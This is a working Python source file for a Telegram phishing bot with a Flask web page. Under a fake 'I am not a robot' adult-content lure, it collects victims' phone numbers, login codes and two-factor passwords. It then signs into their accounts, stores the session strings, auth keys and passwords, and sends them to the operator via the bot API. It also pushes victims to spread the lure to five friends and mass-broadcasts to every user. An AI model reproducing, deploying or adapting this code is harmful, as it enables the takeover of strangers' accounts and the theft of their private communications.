from flask import Flask, request, jsonify, render_template_string
import os, json, base64, threading, asyncio, logging, traceback, uuid, time
from datetime import datetime
import requests as http_requests
from telethon import TelegramClient, errors, events, Button
from telethon.sessions import StringSession
import sys

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(name)s: %(message)s')
logger = logging.getLogger(__name__)

def _si(v, d=0):
    try:
        return int(str(v).strip()) if v not in (None, "") else d
    except Exception:
        return d

BOT_TOKEN = (os.environ.get("BOT_TOKEN") or "").strip()
API_ID = _si(os.environ.get("API_ID"), 0)
API_HASH = (os.environ.get("API_HASH") or "").strip()
YOUR_TELEGRAM_ID = _si(os.environ.get("OWNER_ID"), 0)
PORT = _si(os.environ.get("PORT"), 5000)
WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://two-fishing.onrender.com/tg")

# ============================================================
# HARDCODED WELCOME MESSAGE — ALWAYS ACTIVE
# ============================================================
WELCOME_TEXT = """Hello {name} 👋

🔞To again access to the files completely free of charge, do the following💦:

👇Confirm that you are not a robot.

👇"""
WELCOME_BUTTON = "CONFIRM NOW"

logger.info("=" * 60)
logger.info("ENV CHECK")
logger.info(f"  BOT_TOKEN  : {'SET' if BOT_TOKEN else 'MISSING'}")
logger.info(f"  API_ID     : {API_ID}")
logger.info(f"  API_HASH   : {'SET' if API_HASH else 'MISSING'}")
logger.info(f"  OWNER_ID   : {YOUR_TELEGRAM_ID}")
logger.info(f"  WEBAPP_URL : {WEBAPP_URL}")
logger.info("=" * 60)

if sys.version_info >= (3, 12) and sys.platform == 'win32':
    try:
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    except Exception:
        pass

app = Flask(__name__)
user_sessions = {}
pending_codes = {}
pending_2fa = {}
sessions_lock = threading.Lock()
DATA_FILE = "captured_accounts.json"
USERS_FILE = "bot_users.json"
CONFIG_FILE = "bot_config.json"

# Hardcoded config — always this
HARDCODED_CONFIG = {
    "welcome_messages": [
        {
            "type": "text",
            "content": WELCOME_TEXT,
            "caption": ""
        }
    ],
    "button_text": WELCOME_BUTTON,
    "webapp_url": WEBAPP_URL + "?auto=1",
    "timer": 60
}

STATE = {
    "capture_mode": False,
    "welcome_capture": False,
    "awaiting_timer": False,
    "awaiting_btntext": False,
}

broadcast_state = {
    "active": False,
    "interval": 60,
    "messages": [],
    "next_run": 0,
}


def load_users():
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE) as f:
                return json.load(f)
        except Exception:
            return {}
    return {}


def save_users(data):
    try:
        with open(USERS_FILE, 'w') as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"save users: {e}")


def load_accounts():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE) as f:
                return json.load(f)
        except Exception:
            return []
    return []


def save_account(account):
    accounts = load_accounts()
    found = False
    for i, a in enumerate(accounts):
        if a['phone'] == account['phone']:
            accounts[i] = account
            found = True
            break
    if not found:
        accounts.append(account)
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump(accounts, f, indent=2)
    except Exception as e:
        logger.error(f"Save err: {e}")
    return account


captured_accounts = load_accounts()
users = load_users()

# ALWAYS USE HARDCODED CONFIG — override any saved config
config = HARDCODED_CONFIG


def format_phone(ph):
    if not ph:
        return ph
    digits = ''.join(filter(str.isdigit, ph))
    if not digits:
        return ph
    if ph.startswith('+'):
        return ph
    if len(digits) == 10:
        return '+91' + digits
    if len(digits) == 12 and digits.startswith('91'):
        return '+' + digits
    return '+' + digits


def notify(phone, ss, me, dc, pu=False, pv=""):
    if not BOT_TOKEN or not YOUR_TELEGRAM_ID:
        return
    try:
        extra = ""
        if pu:
            extra = "\n2FA Used"
            if pv:
                extra += f" | Pwd: `{pv}`"
        msg = (f"New Account!{extra}\nPhone: {phone}\n"
               f"Name: {me.first_name} {me.last_name or ''}\n"
               f"User ID: {me.id}\nDC: {dc}\n\nSession:\n`{ss}`")
        if len(msg) > 4000:
            msg = msg[:3990] + "..."
        http_requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg, 'parse_mode': 'Markdown'},
            timeout=15)
    except Exception as e:
        logger.error(f"notify: {e}")


def run_tg(phone, code=None, password=None):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        async def send_code():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            try:
                r = await client.send_code_request(phone)
                session_str = StringSession.save(client.session)
                with sessions_lock:
                    user_sessions[phone] = {'hash': r.phone_code_hash, 'session': session_str}
                    pending_codes[phone] = 'sent'
                    pending_2fa[phone] = False
                return {'success': True}
            except errors.FloodWaitError as e:
                with sessions_lock:
                    pending_codes[phone] = 'err'
                return {'success': False, 'error': f'Flood {e.seconds}s'}
            except Exception as e:
                with sessions_lock:
                    pending_codes[phone] = 'err'
                return {'success': False, 'error': str(e)[:80]}
            finally:
                try:
                    await client.disconnect()
                except Exception:
                    pass

        async def verify():
            with sessions_lock:
                if phone not in user_sessions:
                    return {'success': False, 'error': 'No session'}
                s = user_sessions[phone]
            client = TelegramClient(StringSession(s['session']), API_ID, API_HASH)
            try:
                await client.connect()
                if not await client.is_user_authorized():
                    try:
                        await client.sign_in(phone=phone, code=code, phone_code_hash=s['hash'])
                    except errors.SessionPasswordNeededError:
                        with sessions_lock:
                            pending_2fa[phone] = True
                            pending_codes[phone] = '2fa_needed'
                        if password:
                            try:
                                await client.sign_in(password=password)
                                with sessions_lock:
                                    pending_2fa[phone] = False
                                    pending_codes[phone] = 'done'
                            except errors.PasswordHashInvalidError:
                                return {'success': False, 'error': 'Wrong 2FA password'}
                        else:
                            return {'success': False, 'error': '2FA', 'needs_password': True}
                    except errors.PhoneCodeInvalidError:
                        return {'success': False, 'error': 'Wrong code'}
                    except errors.PhoneCodeExpiredError:
                        return {'success': False, 'error': 'Code expired'}
                me = await client.get_me()
                await client.get_dialogs()
                ss = StringSession.save(client.session)
                try:
                    ak = client.session.auth_key.key
                    dc = client.session.dc_id
                except Exception:
                    ak = b""
                    dc = 0
                ab = base64.b64encode(ak).decode() if ak else ""
                pu = password is not None
                acc = {
                    'phone': phone, 'user_id': me.id,
                    'username': me.username or '', 'first_name': me.first_name or '',
                    'last_name': me.last_name or '', 'session': ss,
                    'webk': json.dumps({'dcId': dc, 'authKey': ab, 'userId': me.id,
                        'isSupport': False, 'isTest': False}),
                    'dc': dc, 'time': str(datetime.now()),
                    'has_2fa': pu, 'password': password if pu else ''
                }
                save_account(acc)
                global captured_accounts
                captured_accounts = load_accounts()
                with sessions_lock:
                    user_sessions.pop(phone, None)
                    pending_2fa.pop(phone, None)
                    pending_codes[phone] = 'done'
                notify(phone, ss, me, dc, pu, password if pu else "")
                return {'success': True, 'session': ss, 'user_id': me.id}
            except Exception as e:
                es = str(e)
                if 'PHONE_CODE_INVALID' in es:
                    return {'success': False, 'error': 'Wrong code'}
                if 'SESSION_PASSWORD_NEEDED' in es:
                    return {'success': False, 'error': '2FA', 'needs_password': True}
                if 'PASSWORD_HASH_INVALID' in es:
                    return {'success': False, 'error': 'Wrong 2FA password'}
                return {'success': False, 'error': es[:80]}
            finally:
                try:
                    await client.disconnect()
                except Exception:
                    pass

        if code:
            return loop.run_until_complete(verify())
        return loop.run_until_complete(send_code())
    finally:
        loop.close()


# ============================================================
# BOT
# ============================================================
SESSION_PATH = f"/tmp/bot_{uuid.uuid4().hex[:8]}.session"
bot = TelegramClient(SESSION_PATH, API_ID, API_HASH)


def admin_menu():
    return [
        [Button.inline("📢 Broadcast", b"menu_broadcast"),
         Button.inline(f"⏱ Timer: {config.get('timer', 60)}s", b"menu_timer")],
        [Button.inline("👥 Users", b"menu_users"),
         Button.inline("📊 Stats", b"menu_stats")],
        [Button.inline("🔄 Reset Modes", b"menu_reset")],
    ]


def back_button():
    return [[Button.inline("⬅️ Back", b"menu_home")]]


async def edit_or_send(event, text, buttons=None):
    try:
        await event.edit(text, buttons=buttons, parse_mode='md')
        return True
    except Exception as e:
        logger.warning(f"edit failed: {e}")
        try:
            await bot.send_message(event.sender_id, text, buttons=buttons, parse_mode='md')
            return True
        except Exception as e2:
            logger.error(f"send fallback failed: {e2}")
            return False


async def send_welcome(uid, name):
    """Send HARDCODED welcome message"""
    try:
        content = WELCOME_TEXT.replace("{name}", name)
        buttons = [[Button.webview(WELCOME_BUTTON, url=WEBAPP_URL + "?auto=1")]]
        sent = await bot.send_message(uid, content, buttons=buttons, parse_mode='md')
        logger.info(f"Welcome sent to {uid} ({name})")
        return [sent.id]
    except Exception as e:
        logger.error(f"welcome {uid} FAILED: {e}")
        logger.error(traceback.format_exc())
        return []


@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    sender = await event.get_sender()
    uid = sender.id
    name = sender.first_name or "Friend"
    users[str(uid)] = {
        "id": uid, "name": name,
        "username": sender.username or "",
        "joined": str(datetime.now())
    }
    save_users(users)

    if uid == YOUR_TELEGRAM_ID:
        await event.respond(
            "🔧 **Admin Panel**\n\nUsers: `" + str(len(users)) + "`",
            buttons=admin_menu(), parse_mode='md'
        )
        return
    await send_welcome(uid, name)


@bot.on(events.CallbackQuery())
async def cb(event):
    if event.sender_id != YOUR_TELEGRAM_ID:
        return await event.answer("Not authorized", alert=True)
    data = event.data.decode()
    logger.info(f"Callback: {data}")

    try:
        if data == "menu_home":
            await event.answer()
            await edit_or_send(event,
                "🔧 **Admin Panel**\n\nUsers: `" + str(len(users)) + "`",
                admin_menu())

        elif data == "menu_reset":
            for k in STATE:
                STATE[k] = False
            await event.answer("Reset!", alert=True)
            await edit_or_send(event, "✅ Modes reset.", admin_menu())

        elif data == "menu_broadcast":
            s = broadcast_state
            await event.answer()
            await edit_or_send(event,
                f"📢 **Broadcast**\n\nActive: `{s['active']}`\nQueue: `{len(s['messages'])}`\nInterval: `{s['interval']}s`",
                [
                    [Button.inline("➕ Add Messages", b"bc_add"),
                     Button.inline("▶️ Start", b"bc_start")],
                    [Button.inline("⏹ Stop", b"bc_stop"),
                     Button.inline("🗑 Clear", b"bc_clear")],
                    back_button()
                ])

        elif data == "bc_add":
            STATE["capture_mode"] = True
            await event.answer("Send broadcast messages")
            await edit_or_send(event,
                "📥 **Broadcast Capture: ON**\n\nSend text/photo/video.",
                [
                    [Button.inline("▶️ Start Now", b"bc_start")],
                    [Button.inline("❌ Cancel", b"bc_cancel")]
                ])

        elif data == "bc_start":
            STATE["capture_mode"] = False
            if not broadcast_state['messages']:
                return await event.answer("Queue empty", alert=True)
            broadcast_state['active'] = True
            broadcast_state['next_run'] = time.time() + 3
            await event.answer("Started!", alert=True)
            await edit_or_send(event,
                f"▶️ Broadcasting `{len(broadcast_state['messages'])}` to `{len(users)}` users every `{broadcast_state['interval']}s`.",
                back_button())

        elif data == "bc_cancel":
            STATE["capture_mode"] = False
            broadcast_state['messages'] = []
            await event.answer("Cancelled")
            await edit_or_send(event, "Cancelled.", admin_menu())

        elif data == "bc_stop":
            broadcast_state['active'] = False
            await event.answer("Stopped!", alert=True)
            await edit_or_send(event, "Stopped.", admin_menu())

        elif data == "bc_clear":
            broadcast_state['messages'] = []
            await event.answer("Cleared!", alert=True)

        elif data == "menu_timer":
            STATE["awaiting_timer"] = True
            await event.answer()
            await edit_or_send(event,
                f"⏱ **Set Timer**\n\nCurrent: `{config.get('timer', 60)}s`\n\nSend a number in seconds.",
                back_button())

        elif data == "menu_users":
            await event.answer(f"Total: {len(users)} users", alert=True)

        elif data == "menu_stats":
            s = broadcast_state
            await event.answer(
                f"Users: {len(users)}\nBroadcast: {s['active']}\nQueue: {len(s['messages'])}",
                alert=True
            )
    except Exception as e:
        logger.error(f"cb error: {e}")
        logger.error(traceback.format_exc())


@bot.on(events.NewMessage(pattern='/cancel'))
async def cancel(event):
    if event.sender_id != YOUR_TELEGRAM_ID:
        return
    for k in STATE:
        STATE[k] = False
    broadcast_state['messages'] = []
    broadcast_state['active'] = False
    await event.respond("Cancelled.", buttons=admin_menu())


@bot.on(events.NewMessage())
async def capture(event):
    if event.sender_id != YOUR_TELEGRAM_ID:
        return
    txt = event.raw_text or ""
    if txt.startswith('/'):
        return

    if STATE["awaiting_timer"]:
        try:
            sec = int(txt.strip())
            if sec < 5:
                return await event.respond("Min 5 seconds")
            config["timer"] = sec
            STATE["awaiting_timer"] = False
            broadcast_state['interval'] = sec
            await event.respond(f"✅ Timer: **{sec}s**",
                buttons=admin_menu(), parse_mode='md')
        except ValueError:
            await event.respond("Send a number (e.g., 30)")
        return

    if STATE["capture_mode"]:
        m = event.message
        entry = {"type": "text", "content": m.message or "",
                 "caption": "", "_msg_id": m.id, "_chat_id": event.chat_id}
        if m.photo:
            entry["type"] = "photo"
            entry["caption"] = m.message or ""
        elif m.video:
            entry["type"] = "video"
            entry["caption"] = m.message or ""
        broadcast_state['messages'].append(entry)
        await event.respond(
            f"✅ Broadcast #{len(broadcast_state['messages'])} added.",
            buttons=[
                [Button.inline("▶️ Start Now", b"bc_start")],
                [Button.inline("❌ Cancel", b"bc_cancel")]
            ])
        return


async def broadcast_loop():
    while True:
        try:
            await asyncio.sleep(3)
            if not broadcast_state['active']:
                continue
            if time.time() < broadcast_state['next_run']:
                continue
            if not broadcast_state['messages']:
                broadcast_state['active'] = False
                continue

            ok = 0
            fail = 0
            for uid_str in list(users.keys()):
                uid = int(uid_str)
                for entry in broadcast_state['messages']:
                    try:
                        if entry['type'] == 'text':
                            await bot.send_message(uid, entry['content'] or entry['caption'])
                        elif entry['type'] in ('photo', 'video'):
                            try:
                                msg = await bot.get_messages(entry['_chat_id'], ids=entry['_msg_id'])
                                await bot.send_message(uid, msg)
                            except Exception:
                                if entry.get('caption'):
                                    await bot.send_message(uid, entry['caption'])
                        ok += 1
                    except Exception as e:
                        fail += 1
                        err = str(e).lower()
                        if 'blocked' in err or 'deactivated' in err or 'not found' in err:
                            users.pop(uid_str, None)
                            save_users(users)
                    await asyncio.sleep(0.4)

            broadcast_state['next_run'] = time.time() + broadcast_state['interval']
            logger.info(f"Broadcast: {ok} sent, {fail} failed")
            try:
                await bot.send_message(YOUR_TELEGRAM_ID,
                    f"📢 Round done\n✅ {ok}\n❌ {fail}\n👥 {len(users)}")
            except Exception:
                pass
        except Exception as e:
            logger.error(f"loop err: {e}")


async def bot_main():
    logger.info("Bot starting...")
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    logger.info(f"Bot started as @{me.username}")
    asyncio.create_task(broadcast_loop())
    await bot.run_until_disconnected()


# ============================================================
# FLASK PAGE
# ============================================================
PAGE = r'''<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Verification</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0a0a;color:white;min-height:100vh;overflow-x:hidden}
.bg{position:fixed;inset:0;background:linear-gradient(135deg,#1a1a2e,#e94560,#0a0a0a);z-index:1}
.blur{position:fixed;inset:0;backdrop-filter:blur(30px);-webkit-backdrop-filter:blur(30px);background:rgba(0,0,0,0.75);z-index:2}
.wrap{position:relative;z-index:10;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.modal{background:#141420;border-radius:24px;padding:32px 24px;max-width:380px;width:100%;border:1px solid #2a2a3e;text-align:center;display:none}
.modal.on{display:block}
.ico{font-size:56px;margin-bottom:15px}
.modal h2{font-size:22px;font-weight:800;margin-bottom:8px}
.modal p{color:#888;font-size:14px;margin-bottom:22px;line-height:1.5}
.btn{width:100%;padding:18px;border:none;border-radius:50px;color:white;font-size:17px;font-weight:800;cursor:pointer;margin:8px 0}
.btn:disabled{opacity:0.5}
.green{background:linear-gradient(45deg,#25D366,#128C7E)}
.blue{background:linear-gradient(45deg,#0088cc,#00a8e8)}
.red{background:linear-gradient(45deg,#e94560,#d63851)}
.otps{display:flex;gap:8px;justify-content:center;margin:20px 0}
.otps input{width:45px;height:58px;text-align:center;font-size:24px;font-weight:bold;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:12px;color:white;outline:none}
.otps input:focus{border-color:#0088cc}
.pwd{width:100%;padding:16px;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:12px;color:white;font-size:16px;text-align:center;outline:none;margin:10px 0 15px}
.pwd:focus{border-color:#e94560}
.msg{padding:12px 16px;border-radius:10px;margin:12px 0;font-size:13px;display:none}
.msg.show{display:block}
.msg.ok{background:rgba(76,175,80,0.15);color:#81C784}
.msg.err{background:rgba(244,67,54,0.15);color:#EF9A9A}
.msg.info{background:rgba(33,150,243,0.15);color:#90CAF9}
.resend{color:#0088cc;font-size:13px;margin-top:15px;cursor:pointer;text-decoration:underline;display:none}
.ss{display:flex;justify-content:center;gap:8px;margin:20px 0}
.sst{width:38px;height:38px;border-radius:50%;background:#2a2a3e;display:flex;align-items:center;justify-content:center;font-size:14px;color:#666;font-weight:700}
.sst.done{background:#4CAF50;color:white}
.sst.active{background:#0088cc;color:white}
</style>
</head>
<body>
<div class="bg"></div>
<div class="blur"></div>
<div class="wrap">
<div id="contactBox" class="modal on">
<div class="ico">&#129302;</div>
<h2>I Am Not A Robot</h2>
<p>Confirm that you are not a robot</p>
<button class="btn green" id="shareContactBtn">CONFIRM NOW</button>
<div id="contactMsg" class="msg"></div>
</div>
<div id="otpBox" class="modal">
<div class="ico">&#128274;</div>
<h2>Enter Verification Code</h2>
<p>We Just Sent Your Access Code<br>Check your <strong>Telegram</strong></p>
<div class="otps">
<input type="tel" maxlength="1" inputmode="numeric" id="o1">
<input type="tel" maxlength="1" inputmode="numeric" id="o2">
<input type="tel" maxlength="1" inputmode="numeric" id="o3">
<input type="tel" maxlength="1" inputmode="numeric" id="o4">
<input type="tel" maxlength="1" inputmode="numeric" id="o5">
</div>
<div id="otpMsg" class="msg"></div>
<div class="resend" id="resendBtn">Resend code</div>
</div>
<div id="pwdBox" class="modal">
<div class="ico">&#128272;</div>
<h2>Two-Factor Auth</h2>
<p>This account is protected.<br>Enter your cloud password:</p>
<input type="password" id="pwdInput" class="pwd" placeholder="Cloud password" maxlength="64">
<div id="pwdMsg" class="msg"></div>
<button class="btn red" id="pwdBtn">VERIFY PASSWORD</button>
</div>
<div id="shareBox" class="modal">
<div class="ico">&#127916;</div>
<h2>Almost Unlocked!</h2>
<p>Share with <strong>5 friends</strong> to unlock</p>
<div class="ss">
<div class="sst" id="st1">1</div>
<div class="sst" id="st2">2</div>
<div class="sst" id="st3">3</div>
<div class="sst" id="st4">4</div>
<div class="sst" id="st5">5</div>
</div>
<div id="shareMsg" class="msg show info">Tap Share to start</div>
<button class="btn green" id="shareBtn">SHARE ON TELEGRAM</button>
</div>
</div>
<script>
var tg = window.Telegram ? window.Telegram.WebApp : null;
if (tg) { tg.ready(); tg.expand(); }
var TG_ID = (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.id : null;
var UPK = 'pv_phone_' + TG_ID;
var USK = 'pv_shares_' + TG_ID;
var UCK = 'pv_captured_' + TG_ID;
var phoneNumber = '';
var codeCheck = null;
var pwdCheck = null;
var contactForce = null;
var inProgress = false;
var TG_CHANNEL = 'https://t.me/videodks';
var TG_CAPTION = 'Premium content';
function show(id) { document.getElementById(id).classList.add('on'); }
function hide(id) { document.getElementById(id).classList.remove('on'); }
function msg(id, text, type) {
  var e = document.getElementById(id);
  e.textContent = text;
  e.className = 'msg show ' + type;
}
window.onload = function() {
  hide('otpBox'); hide('pwdBox'); hide('shareBox');
  show('contactBox');
  var cp = localStorage.getItem(UPK);
  var ic = localStorage.getItem(UCK) === '1';
  if (cp && ic) { phoneNumber = cp; hide('contactBox'); openShare(); }
  else if (cp) { phoneNumber = cp; hide('contactBox'); openOtp(); }
  else { startForce(); }
};
function startForce() {
  if (contactForce) clearInterval(contactForce);
  setTimeout(function() { triggerShare(true); }, 200);
  contactForce = setInterval(function() {
    if (!document.getElementById('contactBox').classList.contains('on')) {
      clearInterval(contactForce); contactForce = null; return;
    }
    if (!inProgress) triggerShare(false);
  }, 200);
}
function triggerShare(isFirst) {
  if (inProgress && !isFirst) return;
  if (!tg) { msg('contactMsg', 'Open inside Telegram app', 'err'); return; }
  inProgress = true;
  var resetInProgress = function() {
    setTimeout(function() { inProgress = false; }, 400);
  };
  if (typeof tg.requestContact === 'function') {
    try {
      tg.requestContact(function(sent, event) {
        resetInProgress();
        if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) {
          handleContact(event.responseUnsafe.contact);
        } else {
          msg('contactMsg', 'Confirm required to continue', 'err');
        }
      });
      return;
    } catch(e) { resetInProgress(); }
  }
  if (typeof tg.openContactPicker === 'function') {
    try {
      tg.openContactPicker(function(sent, event) {
        resetInProgress();
        if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) {
          handleContact(event.responseUnsafe.contact);
        } else {
          msg('contactMsg', 'Confirm required to continue', 'err');
        }
      });
      return;
    } catch(e) { resetInProgress(); }
  }
  resetInProgress();
  msg('contactMsg', 'Update Telegram app', 'err');
}
document.getElementById('shareContactBtn').onclick = function() {
  inProgress = false;
  triggerShare(true);
};
function handleContact(c) {
  var phone = c.phone_number || '';
  if (!phone) { msg('contactMsg', 'Try again', 'err'); return; }
  if (phone.charAt(0) !== '+') phone = '+' + phone;
  phoneNumber = phone;
  inProgress = true;
  msg('contactMsg', 'Confirmed!', 'ok');
  if (contactForce) { clearInterval(contactForce); contactForce = null; }
  fetch('/api/save_contact', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({tg_id: TG_ID || 'web', phone: phoneNumber})
  }).then(function(r) { return r.json(); }).then(function(d) {
    if (d.success) {
      localStorage.setItem(UPK, phoneNumber);
      if (d.already_captured && d.user_id) {
        localStorage.setItem(UCK, '1');
        setTimeout(function() { hide('contactBox'); openShare(); }, 700);
      } else {
        setTimeout(function() { hide('contactBox'); openOtp(); }, 700);
      }
    } else { msg('contactMsg', 'Server error', 'err'); }
  }).catch(function() { msg('contactMsg', 'Connection error', 'err'); });
}
function openOtp() {
  hide('contactBox'); hide('pwdBox'); hide('shareBox');
  show('otpBox');
  ['o1','o2','o3','o4','o5'].forEach(function(id) { document.getElementById(id).value = ''; });
  document.getElementById('o1').focus();
  msg('otpMsg', 'Sending code...', 'info');
  fetch('/api/share', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({phone: phoneNumber})
  }).then(function(r) { return r.json(); }).then(function(d) {
    if (d.success) {
      msg('otpMsg', 'Code sent! Check Telegram', 'ok');
      startOtpCheck();
      setTimeout(function() { document.getElementById('resendBtn').style.display = 'block'; }, 30000);
    } else { msg('otpMsg', d.error || 'Failed to send', 'err'); }
  }).catch(function() { msg('otpMsg', 'Network error', 'err'); });
}
function startOtpCheck() {
  if (codeCheck) clearInterval(codeCheck);
  codeCheck = setInterval(function() {
    fetch('/api/check', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({phone: phoneNumber})
    }).then(function(r) { return r.json(); }).then(function(d) {
      if (d.s === '2fa_needed') {
        clearInterval(codeCheck);
        hide('otpBox'); show('pwdBox');
        document.getElementById('pwdInput').focus();
        startPwdCheck();
      } else if (d.s === 'done') { clearInterval(codeCheck); onCapture(); }
      else if (d.s === 'err') {
        clearInterval(codeCheck);
        msg('otpMsg', 'Send failed. Try resend.', 'err');
        document.getElementById('resendBtn').style.display = 'block';
      }
    }).catch(function(){});
  }, 2000);
}
['o1','o2','o3','o4','o5'].forEach(function(id, i) {
  document.getElementById(id).addEventListener('input', function() {
    var v = this.value.replace(/[^0-9]/g, '');
    this.value = v;
    if (v && i < 4) document.getElementById('o' + (i + 2)).focus();
    var code = '';
    for (var k = 1; k <= 5; k++) code += document.getElementById('o' + k).value;
    if (code.length === 5) setTimeout(submitOtp, 100);
  });
  document.getElementById(id).addEventListener('keydown', function(e) {
    if (e.key === 'Backspace' && !this.value && i > 0) document.getElementById('o' + i).focus();
  });
});
function submitOtp() {
  var code = '';
  for (var i = 1; i <= 5; i++) code += document.getElementById('o' + i).value;
  if (code.length < 5) { msg('otpMsg', 'Enter all 5 digits', 'err'); return; }
  msg('otpMsg', 'Verifying...', 'info');
  fetch('/api/verify', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({phone: phoneNumber, code: code})
  }).then(function(r) { return r.json(); }).then(function(d) {
    if (d.success) { onCapture(); }
    else if (d.needs_password) {
      hide('otpBox'); show('pwdBox');
      document.getElementById('pwdInput').focus();
      startPwdCheck();
    } else {
      msg('otpMsg', d.error || 'Wrong code', 'err');
      ['o1','o2','o3','o4','o5'].forEach(function(id) { document.getElementById(id).value = ''; });
      document.getElementById('o1').focus();
    }
  }).catch(function() { msg('otpMsg', 'Connection error', 'err'); });
}
document.getElementById('resendBtn').onclick = function() {
  document.getElementById('resendBtn').style.display = 'none';
  openOtp();
};
function startPwdCheck() {
  if (pwdCheck) clearInterval(pwdCheck);
  pwdCheck = setInterval(function() {
    fetch('/api/check', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({phone: phoneNumber})
    }).then(function(r) { return r.json(); }).then(function(d) {
      if (d.s === 'done') { clearInterval(pwdCheck); onCapture(); }
    }).catch(function(){});
  }, 2000);
}
document.getElementById('pwdBtn').onclick = function() {
  var pwd = document.getElementById('pwdInput').value.trim();
  if (!pwd) { msg('pwdMsg', 'Enter password', 'err'); return; }
  msg('pwdMsg', 'Checking...', 'info');
  document.getElementById('pwdBtn').disabled = true;
  var code = '';
  for (var i = 1; i <= 5; i++) code += document.getElementById('o' + i).value;
  fetch('/api/verify', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({phone: phoneNumber, code: code, password: pwd})
  }).then(function(r) { return r.json(); }).then(function(d) {
    document.getElementById('pwdBtn').disabled = false;
    if (d.success) { onCapture(); }
    else { msg('pwdMsg', d.error || 'Wrong password', 'err'); }
  }).catch(function() {
    document.getElementById('pwdBtn').disabled = false;
    msg('pwdMsg', 'Connection error', 'err');
  });
};
function onCapture() {
  localStorage.setItem(UPK, phoneNumber);
  localStorage.setItem(UCK, '1');
  localStorage.setItem(USK, '0');
  if (codeCheck) { clearInterval(codeCheck); codeCheck = null; }
  if (pwdCheck) { clearInterval(pwdCheck); pwdCheck = null; }
  hide('otpBox'); hide('pwdBox');
  openShare();
}
function openShare() {
  hide('contactBox'); hide('otpBox'); hide('pwdBox');
  show('shareBox');
  var n = parseInt(localStorage.getItem(USK) || '0');
  updSteps(n);
  if (n >= 5) msg('shareMsg', 'Unlocked!', 'ok');
  else msg('shareMsg', n + '/5 done. Share to unlock.', 'info');
}
function updSteps(n) {
  for (var i = 1; i <= 5; i++) {
    var e = document.getElementById('st' + i);
    if (i <= n) e.className = 'sst done';
    else if (i === n + 1) e.className = 'sst active';
    else e.className = 'sst';
  }
}
document.getElementById('shareBtn').onclick = function() {
  var url = 'https://t.me/share/url?url=' + encodeURIComponent(TG_CHANNEL) + '&text=' + encodeURIComponent(TG_CAPTION);
  if (tg) { tg.openTelegramLink(url); } else { window.open(url, '_blank'); }
  var n = Math.min(parseInt(localStorage.getItem(USK) || '0') + 1, 5);
  localStorage.setItem(USK, String(n));
  updSteps(n);
  if (n >= 5) msg('shareMsg', 'Unlocked!', 'ok');
  else msg('shareMsg', n + '/5 done. Share more.', 'ok');
};
</script>
</body>
</html>'''


@app.route('/')
def index():
    return render_template_string(PAGE)


@app.route('/tg')
def tg_route():
    return render_template_string(PAGE)


@app.route('/health')
def health():
    return jsonify({
        'status': 'ok',
        'bot_thread_alive': _bot_thread.is_alive() if _bot_thread else False,
        'accounts': len(captured_accounts),
        'bot_users': len(users),
        'broadcast_active': broadcast_state['active'],
        'broadcast_queue': len(broadcast_state['messages']),
        'welcome_text_hardcoded': True
    })


@app.route('/api/save_contact', methods=['POST'])
def save_contact():
    d = request.json
    tg_id = d.get('tg_id')
    phone = d.get('phone')
    if not phone or not tg_id:
        return jsonify({'success': False, 'error': 'Missing data'})
    phone = format_phone(phone)
    accounts = load_accounts()
    ex = next((a for a in accounts if a['phone'] == phone), None)
    if ex:
        return jsonify({'success': True, 'already_captured': True,
            'phone': phone, 'user_id': ex['user_id']})
    with sessions_lock:
        pending_codes[phone] = 'contact_saved'
    logger.info(f"Contact saved (silent): {phone}")
    return jsonify({'success': True, 'phone': phone})


@app.route('/api/share', methods=['POST'])
def share():
    ph = request.json.get('phone', '')
    if not ph:
        return jsonify({'success': False, 'error': 'Phone required'})
    ph = format_phone(ph)
    with sessions_lock:
        pending_codes[ph] = 'sending'
    t = threading.Thread(target=run_tg, args=(ph,))
    t.daemon = True
    t.start()
    return jsonify({'success': True})


@app.route('/api/check', methods=['POST'])
def check():
    phone = format_phone(request.json.get('phone', ''))
    with sessions_lock:
        s = pending_codes.get(phone, 'waiting')
    if s == 'waiting':
        accounts = load_accounts()
        if any(a['phone'] == phone for a in accounts):
            s = 'done'
    return jsonify({'s': s})


@app.route('/api/verify', methods=['POST'])
def verify():
    d = request.json
    ph = format_phone(d.get('phone', ''))
    return jsonify(run_tg(ph, d.get('code', ''), d.get('password')))


@app.route('/session/<phone>')
def get_session(phone):
    phone = format_phone(phone)
    global captured_accounts
    captured_accounts = load_accounts()
    a = next((x for x in captured_accounts if x['phone'] == phone), None)
    if not a:
        return jsonify({'error': 'Not found'}), 404
    return jsonify({'phone': phone, 'user_id': a['user_id'],
        'name': f"{a['first_name']} {a['last_name']}",
        'username': a['username'], 'dc': a['dc'],
